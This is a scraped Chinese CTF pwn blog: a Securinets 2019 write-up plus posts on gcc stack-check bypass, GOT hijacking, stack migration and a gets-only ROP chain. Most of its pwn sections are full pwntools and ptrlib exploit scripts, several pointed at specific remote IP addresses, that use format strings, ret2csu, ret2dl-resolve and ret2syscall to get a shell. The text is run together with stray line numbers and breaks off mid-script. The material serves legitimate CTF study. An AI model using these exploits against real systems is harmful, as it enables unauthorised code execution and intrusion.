123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./baby1')else: p = remote('51.254.114.246', 1111)elf = ELF('./baby1')read_plt = elf.plt['read']write_plt = elf.plt['write']read_got = elf.got['read']write_got = elf.got['write']main = elf.symbols['main']# gdb.attach(p)buf = 0x0602000-0x100# 4006a0: 4c 89 ea mov rdx,r13# 4006a3: 4c 89 f6 mov rsi,r14# 4006a6: 44 89 ff mov edi,r15d# 4006a9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4006ad: 48 83 c3 01 add rbx,0x1# 4006b1: 48 39 eb cmp rbx,rbp# 4006b4: 75 ea jne 4006a0 &lt;__libc_csu_init+0x40&gt;# 4006b6: 48 83 c4 08 add rsp,0x8# 4006ba: 5b pop rbx# 4006bb: 5d pop rbp# 4006bc: 41 5c pop r12# 4006be: 41 5d pop r13# 4006c0: 41 5e pop r14# 4006c2: 41 5f pop r15# 4006c4: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, addr): payload = '\\x00' * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + '\\x00' * 56 + p64(addr) p.sendline(payload)# payload = cyclic(500)offset = 56csu(0, 1, write_got, 8, write_got, 1, main)write = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))success('write = ' + hex(write))write_offset = 0x0f72b0libc_base = write - write_offsetsuccess('libc_base = ' + hex(libc_base))execve = libc_base + 0x0000000000cc770system = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57csu(0, 1, read_got, 16, buf, 0, main)p.send(p64(execve) + '/bin/sh\\x00')csu(0, 1, buf, 0, 0, buf + 8, main)p.interactive() Simple1234567root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple[*] '/root/ctf/2019-Securinets/pwn/Simple/simple' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida 反编译 main 函数： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-50h] unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); read(0, &amp;buf, 0x3FuLL); printf(&amp;buf, &amp;buf); perror(\"hemm okay\\n\"); return __readfsqword(0x28u) ^ v5;&#125; 在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./simple') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one_gadget_offset = 0x4f322else: p = remote('51.254.114.246', 4444) libc = ELF('libc.so.6') one_gadget_offset = 0x4526aelf = ELF('./simple')main = elf.symbols['main']perror_got = elf.got['perror']read_got = elf.got['read']payload = '%14$p%10$s%1682c%9$hn'payload += '\\x00' * (24 - len(payload))payload += p64(perror_got)payload += p64(read_got)p.send(payload)leak = p.recv()offset = 0xd8ret = int(leak[0:14], 16) - offsetread = u64(leak[14:20].ljust(8, '\\x00'))success('read = ' + hex(read))libc_base = read - libc.symbols['read']success('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offseta0 = one_gadget &amp; 0xffffa1 = ((one_gadget &amp; 0xffff0000) &gt;&gt; 16)a1 = (a1 - a0 - 1) % 0x10000 + 1payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(a0, 10)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(a1, 11)payload += '\\x00' * (32 - len(payload))payload += p64(ret)payload += p64(ret + 2)p.sendline(payload)payload = '%1430c%8$hn'payload += '\\x00' * (16 - len(payload))payload += p64(perror_got)p.sendline(payload)p.interactive() Baby Two1234567$ checksec ./baby2[*] '/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida 反编译 main 函数： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+8h] [ebp-30h] setvbuf(_bss_start, 0, 2, 0); return read(0, &amp;buf, 0x12Cu);&#125; 只有一个read，直接上ret2dl-resolve一把梭，以下是Yudai 大佬的 exp，用到了大佬写的库ptrlib： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#!/usr/bin/env python3from ptrlib import *import timeelf = ELF('./baby2')addr_plt = 0x08048320addr_start = elf.symbol('_start')addr_relplt = elf.section('.rel.plt')addr_dynsym = elf.section('.dynsym')addr_dynstr = elf.section('.dynstr')addr_bss = elf.section('.bss')rop_pop3 = 0x08048509rop_ret = 0x080482fafname = 'system\\x00'farg = '/bin/sh\\x00'plt_read = 0x08048330base_stage = addr_bss + 0x800addr_reloc = addr_bss + 0xa00addr_sym = addr_bss + 0xa80 | (addr_dynsym &amp; 0xF)addr_str = addr_bss + 8addr_arg = addr_str + len(fname)# Elf32_Relreloc = p32(elf.got('setvbuf'))reloc += p32((((addr_sym - addr_dynsym) // 0x10) &lt;&lt; 8) | 7)# Elf32_Symsym = p32(addr_str - addr_dynstr)sym += p32(0)sym += p32(0)sym += p32(0x12)def craft_read(addr, size): payload = p32(plt_read) payload += p32(rop_pop3) payload += p32(0) # fd payload += p32(addr) # buf payload += p32(size) # size return payload# ncat -vc ./baby2 -kl 8888sock = Socket('127.0.0.1', 8888)# sock = Socket('51.254.114.246', 2222)''' Stage 1 (probabilistic write) '''payload1 = b''payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)payload1 += craft_read(base_stage, 0x100) # 5 * 4payload1 += p32(addr_start) # 4payload1 += bytes([0x20])''' Stage 2 (stack pivot) '''payload2 = b'A' * 0x2cpayload2 += p32(base_stage + 4)payload2 += b'\\x00' * (0x12c - len(payload2))''' Stage 3 (craft) '''reloc_offset = addr_reloc - addr_relpltpayload3 = b''payload3 += craft_read(addr_reloc, 0x8)payload3 += craft_read(addr_sym, 0x10)payload3 += craft_read(addr_str, len(fname))payload3 += craft_read(addr_arg, len(farg))payload3 += p32(addr_plt)payload3 += p32(reloc_offset)payload3 += b'XXXX'payload3 += p32(addr_arg)payload3 += b'\\x00' * (0x100 - len(payload3))# Stage 1sock.send(payload1)time.sleep(0.5)sock.send(payload3)# Stage 2sock.send(payload2)# Stage 3sock.send(reloc)sock.send(sym)sock.send(fname)sock.send(farg)sock.interactive() WebFeedback这是一道XXE_Processing&gt;)，通过 burpsuite 抓包，然后直接利用网上的 exp看到： 然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag： 发现没有，再试试 apche 根目录： 还是不行。发现网站是 nginx 搭的，就 google 一下nginx 的默认 www 目录： 然后可以看到 root 的路径，尝试获得 flag： ForenEasy Trade用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key： 然后再往下看可以找到一个 PK 头的 zip，看得到里面有flag.txt： 拿到flag.txt的内容后 base64 解密一下拿到 flag： 12345678910$ cat datasecurinetsXD$ unzip flag.zipArchive: flag.zip[flag.zip] flag.txt password: extracting: flag.txt$ cat flag.txt | base64 -Dsecurinets&#123;954f670cb291ec276b1a9ff8453ea60% MiscHIDDEN题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https： 点开后在证书中看到 flag： EZ图片隐写，在线解密一下： 123456789101112131415161718192021222324252627--START--&quot;The fact is that upon his entrance I had instantly recognized the extremepersonal danger in which I lay. The only conceivable escape for him lay in silencingmy tongue. In an instant I had slipped the revolver from the drawer into mypocket and was covering him through the cloth. At his remark I drew the weaponout and laid it cocked upon the table. He still smiled and blinked, but there wassomething about his eyes which made me feel very glad that I had it there,&quot;You evidently don&apos;t know me,&apos; said he.&quot;&apos;On the contrary,&apos; I answered, &apos;I think it is fairly evident that I do. Pray takea chair. I can spare you five minutes if you have anything to say.&apos;&quot;&apos;All that I have to say has already crossed your mind,&apos; said he.&quot;&apos;Then possibly my answer has crossed yours,&apos; I replied.&quot;&apos;You stand fast?&apos;&quot;&apos;Absolutely.&apos;&quot;He clapped his hand into his pocket, and I raised the pistol from the table.But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled somedates.&quot;You crossed my path on the fourth of January,&apos; said he. &apos;On the twenty-thirdyou incommoded me; by the middle of February I was seriously inconveniencedby you; at the end of March I was absolutely hampered in my plans; and now, atthe close of April, I find myself placed in such a position through your continualpersecution that I am in positive danger of losing my liberty. The situation isbecoming an impossible one.&apos;&quot;&apos;Have you any suggestion to make?&apos; I asked.&quot;&apos;You must drop it, Mr. Holmes,&apos; said he, swaying his face about. &apos;You reallymust, you know.&apos;&quot;--END--; 可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是福尔摩斯的一个片段，找到单词之后，在线 sha1哈希一下得到 flag。 Referencehttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.behttps://ptr-yudai.hatenablog.com/entry/2019/03/25/152043https://www.rootnetsec.com/securinets-prequals-automateme/https://ctftime.org/writeup/14075","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"Buffer Overflow with gcc>=4.9","slug":"Buffer-Overflow-with-gcc-4-9","date":"2019-03-17T09:43:52.000Z","updated":"2019-08-26T05:54:45.733Z","comments":true,"path":"2019/03/17/Buffer-Overflow-with-gcc-4-9/","link":"","permalink":"qianfei11.coding.me/2019/03/17/Buffer-Overflow-with-gcc-4-9/","excerpt":"gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。","text":"gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。 Source自己写的一道题目，源码： 1234567891011121314// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); char buf[200]; printf(\"say something: \"); gets(buf); return 0;&#125; Analysis乍一看是静态编译，然后又是 gets，一定是很容易的栈溢出，但是大于 4.9 版本的 gcc 是不太一样的。main 函数中是这样的： 1234567891011121314150804887c &lt;main&gt;: 804887c: 8d 4c 24 04 lea ecx,[esp+0x4] 8048880: 83 e4 f0 and esp,0xfffffff0 8048883: ff 71 fc push DWORD PTR [ecx-0x4] 8048886: 55 push ebp 8048887: 89 e5 mov ebp,esp 8048889: 51 push ecx 804888a: 81 ec d4 00 00 00 sub esp,0xd4 ...... 80488eb: 83 c4 10 add esp,0x10 80488ee: b8 00 00 00 00 mov eax,0x0 80488f3: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 80488f6: c9 leave 80488f7: 8d 61 fc lea esp,[ecx-0x4] 80488fa: c3 ret 这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到 ecx 上，导致最后恢复的栈值不存在。通过 gdb 调试我们可以看得更清楚： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x804887c (&lt;main&gt;: lea ecx,[esp+0x4])EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0xffffcd90 --&gt; 0x1EDX: 0xffffcdb4 --&gt; 0x80481a8 (&lt;_init&gt;: push ebx)ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcc94 --&gt; 0x2c0003fEIP: 0x8048893 (&lt;main+23&gt;: push 0x80bb288)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x8048889 &lt;main+13&gt;: push ecx 0x804888a &lt;main+14&gt;: sub esp,0xd4 0x8048890 &lt;main+20&gt;: sub esp,0xc=&gt; 0x8048893 &lt;main+23&gt;: push 0x80bb288 0x8048898 &lt;main+28&gt;: call 0x804ed60 &lt;printf&gt; 0x804889d &lt;main+33&gt;: add esp,0x10 0x80488a0 &lt;main+36&gt;: sub esp,0xc 0x80488a3 &lt;main+39&gt;: lea eax,[ebp-0xd0]──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcc94 --&gt; 0x2c0003f0004| 0xffffcc98 --&gt; 0xfff0008| 0xffffcc9c --&gt; 0x00012| 0xffffcca0 --&gt; 0x00016| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0020| 0xffffcca8 --&gt; 0x00024| 0xffffccac --&gt; 0xf0b5ff0028| 0xffffccb0 --&gt; 0xffffccee --&gt; 0xe6ce0000───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x08048893 7 printf(&quot;say something: &quot;);assassinq&gt;&gt; p $ecx$1 = 0xffffcd90......────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x0EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0x42424242 (&apos;BBBB&apos;)EDX: 0x80eb4e0 --&gt; 0x0ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcca0 --&gt; 0x0EIP: 0x80488ba (&lt;main+62&gt;: leave)EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x80488af &lt;main+51&gt;: add esp,0x10 0x80488b2 &lt;main+54&gt;: mov eax,0x0 0x80488b7 &lt;main+59&gt;: mov ecx,DWORD PTR [ebp-0x4]=&gt; 0x80488ba &lt;main+62&gt;: leave 0x80488bb &lt;main+63&gt;: lea esp,[ecx-0x4] 0x80488be &lt;main+66&gt;: ret 0x80488bf: nop 0x80488c0 &lt;generic_start_main&gt;: push esi──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcca0 --&gt; 0x00004| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0008| 0xffffcca8 (&apos;A&apos; &lt;repeats 200 times&gt;...)0012| 0xffffccac (&apos;A&apos; &lt;repeats 200 times&gt;...)0016| 0xffffccb0 (&apos;A&apos; &lt;repeats 196 times&gt;, &quot;BBBB&quot;)0020| 0xffffccb4 (&apos;A&apos; &lt;repeats 192 times&gt;, &quot;BBBB&quot;)0024| 0xffffccb8 (&apos;A&apos; &lt;repeats 188 times&gt;, &quot;BBBB&quot;)0028| 0xffffccbc (&apos;A&apos; &lt;repeats 184 times&gt;, &quot;BBBB&quot;)───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x080488ba 10 &#125;assassinq&gt;&gt; p $ecx$2 = 0x42424242 显然 ecx 的作用是使得 esp 恢复到原来的值，那么如果我们破坏了 esp，那么会造成奇怪的影响。既然 ecx 无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现 ecx 的最低两个字节是 0x90，如果我们把它改成 00，那么我们的栈就会往下掉 0x90 个字节，我们输入的 buf 就能有用武之地。由于这里输入使用的是 gets，采用的是 0x00 截断我们的输入，我们可以充分利用这个特点，达到我们的目的。 这个程序是静态编译的，可以使用 ret2syscall。我们把 rop 填在 buf 的最后面，前面则填满一个 ret 的 gadget，这样的话只要 ecx 保存的地址低两位大于我们 rop 的长度，就有概率成功打通。 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'local = 1if local: p = process('./p3')else: p = remote('10.21.13.69', 10016)elf = ELF('./p3')g = lambda x: next(elf.search(asm(x)))ret = g('ret')info('ret = ' + hex(ret))pop_eax_ret = g('pop eax ; ret')pop_ebx_ret = g('pop ebx ; ret')pop_ecx_ret = g('pop ecx ; ret')pop_edx_ret = g('pop edx ; ret')int_0x80_ret = g('int 0x80 ; ret')buf = 0x080eb000 - 100# gdb.attach(p)offset = 204# read(0, '/bin/sh\\x00', 100)rop1 = [ pop_eax_ret, 3, pop_ebx_ret, 0, pop_ecx_ret, buf, pop_edx_ret, 100, int_0x80_ret,]# execve('/bin/sh\\x00', 0, 0)rop2 = [ pop_eax_ret, 0xb, pop_ebx_ret, buf, pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80_ret]rop = ''.join(map(p32, rop1 + rop2))info('len(rop) = ' + str(len(rop)))offset2 = offset - len(rop)info('offset2 = ' + str(offset2))payload = p32(ret) * (offset2 / 4) + ropinfo('len(payload) = ' + str(len(payload)))# payload = cyclic(500)p.sendline(payload)p.sendline('/bin/sh\\x00')p.interactive() Reference【ctf-pwn】【winesap】STCS 2016 Week4","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"Got Hijacking and Stack Migration","slug":"Got-Hijacking-and-Stack-Migration","date":"2019-03-16T03:49:16.000Z","updated":"2019-08-26T05:53:00.448Z","comments":true,"path":"2019/03/16/Got-Hijacking-and-Stack-Migration/","link":"","permalink":"qianfei11.coding.me/2019/03/16/Got-Hijacking-and-Stack-Migration/","excerpt":"记录两道题目，关于Got Hijacking和Stack Migration。","text":"记录两道题目，关于Got Hijacking和Stack Migration。 Got Hijacking一般在有格式化字符串漏洞的地方或者 heap 的漏洞利用中经常用到，通过修改某个常规函数的 got 表达到奇怪的目的。 Source1234567891011121314151617// gcc main.c -o main#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void A()&#123; setvbuf(stdout,0,_IONBF,0); srand(time(0)^getpid()); char buf[100]; int magic = rand(); gets(buf); if(atoi(buf)==magic)&#123; puts(\"OKay...\"); &#125;&#125;int main()&#123; A();&#125; Analysis想法是直接把 puts 的 got 盖成 system，总共送两次 payload。 Exploit1234567891011121314151617181920212223242526272829#!/usr/bin/env pythonfrom pwn import *# context.log_level='debug'context.terminal = ['tmux', 'sp', '-h']context.arch = 'amd64'p = process('./main')elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))A = elf.symbols['A']gets_plt = elf.plt['gets']puts_plt = elf.plt['puts']puts_got = elf.got['puts']puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))pop_rdi_ret = g('pop rdi ; ret')# gdb.attach(p)offset = 136payload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)p.sendline(payload)libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - puts_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)p.sendline(payload)p.sendline(p64(system))p.interactive() Stack Migration栈迁移（Stack Migration）是在可以输入的 ROP 链长度不够时，可以扩展输入的方法。 核心概念是将 ROP 链分别写在指定区域，然后再把栈迁移过去执行。 其中为了保持栈帧平衡最重要的一条指令是leave ; ret，32 位下等价于mov esp, ebp ; pop ebp。 Source1234567891011121314// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now#include&lt;stdio.h&gt;void vul()&#123; char buf[0x20]; memset(buf,0,0x20); read(0,buf,0x30); puts(buf);&#125;int main()&#123; vul(); return 0;&#125; 源码中 buf 为 0x20 个字节，但只让读 0x30 个字节，也就是说我们只能修改 ebp 和 ret 的地址。 Analysisobjdump 反汇编一下 vul 函数： 12345678910111213141516171819202100000000004006a6 &lt;vul&gt;: 4006a6: 55 push rbp 4006a7: 48 89 e5 mov rbp,rsp 4006aa: 48 83 ec 20 sub rsp,0x20 4006ae: 48 8d 45 e0 lea rax,[rbp-0x20] 4006b2: ba 20 00 00 00 mov edx,0x20 4006b7: be 00 00 00 00 mov esi,0x0 4006bc: 48 89 c7 mov rdi,rax 4006bf: e8 c4 fe ff ff call 400588 &lt;_init+0x40&gt; ; memset 4006c4: 48 8d 45 e0 lea rax,[rbp-0x20] 4006c8: ba 30 00 00 00 mov edx,0x30 4006cd: 48 89 c6 mov rsi,rax 4006d0: bf 00 00 00 00 mov edi,0x0 4006d5: b8 00 00 00 00 mov eax,0x0 4006da: e8 b1 fe ff ff call 400590 &lt;_init+0x48&gt; ; read 4006df: 48 8d 45 e0 lea rax,[rbp-0x20] 4006e3: 48 89 c7 mov rdi,rax 4006e6: e8 95 fe ff ff call 400580 &lt;_init+0x38&gt; ; puts 4006eb: 90 nop 4006ec: c9 leave 4006ed: c3 ret 看到 read 其实是往 rbp-0x20 的地方读东西。那么可以想到在第一次 payload 的时候改掉 ebp，然后 ret 到 read 这个地方，于是第二次就可以读一段 rop 到我们设置的 buf 上。然后跳过去。最后一次再跳回到 A，然后往 buf 上写&quot;system(&quot;/bin/sh&quot;)&quot;，再把栈搬过去就能 getshell。 Exploit1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = process('./main')else: p = remote('10.21.13.69', 10015)elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))leave_ret = g('leave ; ret') # 0x00000000004005ecpop_rdi_ret = g('pop rdi ; ret') # 0x0000000000400673sub_rsp_0x20 = g('sub rsp, 0x20') # 0x4005aaread_plt = elf.plt['read'] # 0x400490read_got = elf.got['read'] # 0x600fe8puts_plt = elf.plt['puts'] # 0x400480buf = 0x00602000 - 0x100vul = elf.symbols['vul'] # 0x4005a6gadget1 = 0x4006c4read_offset = libc.symbols['read']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))# p.send(p64(0xdeadbeef).ljust(0x20,'\\x00'))# gdb.attach(p)payload = 'A' * 32 + p64(buf) + p64(gadget1)p.send(payload) # edit rbppayload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - 0x20 - 8) + p64(leave_ret)p.send(payload)read = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))libc_base = read - read_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(32, '\\x00') + p64(buf - 0x28 - 8) + p64(leave_ret)p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"Gets一把梭","slug":"Gets一把梭","date":"2019-03-07T04:50:23.000Z","updated":"2019-08-26T05:52:35.364Z","comments":true,"path":"2019/03/07/Gets一把梭/","link":"","permalink":"qianfei11.coding.me/2019/03/07/Gets一把梭/","excerpt":"如果程序只有一个gets()。","text":"如果程序只有一个gets()。 Checksecchecksec： 123456[*] &apos;/home/assassinq/pwn/r3t/GETS/gets&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Main Function只有一个 main 函数，就给了一个gets()： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] gets(&amp;v4, argv, envp); return 0;&#125; Solution这道题的思路主要是泄漏出 gets 的真实地址，然后利用给出的 libc 计算出 gets 与 system 之间的 offset 得到 system 的地址，最后读入 sh，执行 system 拿到 shell。 Gadgets先放上会用到的 gadgets： 1234567891011g = lambda x: next(elf.search(asm(x)))pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]') Buf因为操作很多，我们需要通过栈迁移来达到目的，所以使用了很多 bss 段上的空间： 123456789bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800 Analyse第一个 rop 将所有的 buf 用 gets 读上来。并且最后通过leave ; ret跳到 buf1 上： 12345678910rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret] 第二个 rop 为我们读入 buf1 的内容。先看看这里 gets 的 got 表处的情况： 12345678910111213141516.got.plt:0000000000601020 off_601020 dq offset gets ; DATA XREF: _gets↑r.got.plt:0000000000601020 _got_plt ends.got.plt:0000000000601020.data:0000000000601028 ; ===========================================================================.data:0000000000601028.data:0000000000601028 ; Segment type: Pure data.data:0000000000601028 ; Segment permissions: Read/Write.data:0000000000601028 ; Segment alignment &apos;qword&apos; can not be represented in assembly.data:0000000000601028 _data segment para public &apos;DATA&apos; use64.data:0000000000601028 assume cs:_data.data:0000000000601028 ;org 601028h.data:0000000000601028 public __data_start ; weak.data:0000000000601028 __data_start db 0 ; Alternative name is &apos;__data_start&apos;.data:0000000000601028 ; data_start.data:0000000000601029 db 0.data:000000000060102A db 0 got 表在这里是只读的，但在后面的 data 段是可写的。我们可以先在 gets 地址后面 24byte 的地方填上leave ; ret，然后为跳转到 buf2 提前设好 rbp。最后利用pop_rsp_r13_r14_r15_ret把 gets 的地址放到 r13 上。前面可以。同时接上第三个 rop 送上去的leave_ret： 123456789rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret] 然后接下来需要用到__libc_csu_init()这个函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:0000000000400550 ; void _libc_csu_init(void).text:0000000000400550 public __libc_csu_init.text:0000000000400550 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:0000000000400550 ; __unwind &#123;.text:0000000000400550 push r15.text:0000000000400552 push r14.text:0000000000400554 mov r15d, edi.text:0000000000400557 push r13.text:0000000000400559 push r12.text:000000000040055B lea r12, __frame_dummy_init_array_entry.text:0000000000400562 push rbp.text:0000000000400563 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040056A push rbx.text:000000000040056B mov r14, rsi.text:000000000040056E mov r13, rdx.text:0000000000400571 sub rbp, r12.text:0000000000400574 sub rsp, 8.text:0000000000400578 sar rbp, 3.text:000000000040057C call _init_proc.text:0000000000400581 test rbp, rbp.text:0000000000400584 jz short loc_4005A6.text:0000000000400586 xor ebx, ebx.text:0000000000400588 nop dword ptr [rax+rax+00000000h].text:0000000000400590.text:0000000000400590 loc_400590: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400590 mov rdx, r13.text:0000000000400593 mov rsi, r14.text:0000000000400596 mov edi, r15d.text:0000000000400599 call qword ptr [r12+rbx*8].text:000000000040059D add rbx, 1.text:00000000004005A1 cmp rbx, rbp.text:00000000004005A4 jnz short loc_400590.text:00000000004005A6.text:00000000004005A6 loc_4005A6: ; CODE XREF: __libc_csu_init+34↑j.text:00000000004005A6 add rsp, 8.text:00000000004005AA pop rbx.text:00000000004005AB pop rbp.text:00000000004005AC pop r12.text:00000000004005AE pop r13.text:00000000004005B0 pop r14.text:00000000004005B2 pop r15.text:00000000004005B4 retn.text:00000000004005B4 ; &#125; // starts at 400550.text:00000000004005B4 __libc_csu_init endp 实际上__libc_csu_init()没有做任何事情，无论我们调用多少次都是一样的。我们先通过第四个 rop 把它写到 buf2 上，后面再解释需要做什么： 1234rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret] 第五个 rop 往 buf2-24 和 buf2+32 的地方写东西，之后再跳上去。因为之前 gets 的地址已经被 pop 到了 r13 上，然后走一次__libc_csu_init()会 push 到栈上，这个时候也就是 buf2，之后接上一个pop rbx就能给 rbx。然后为了得到 system 的地址，我们需要用add_ebx_esi_ret把两者加起来。加完之后再把 ebx 放回栈上，也就是 buf2： 12345678910111213141516rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, 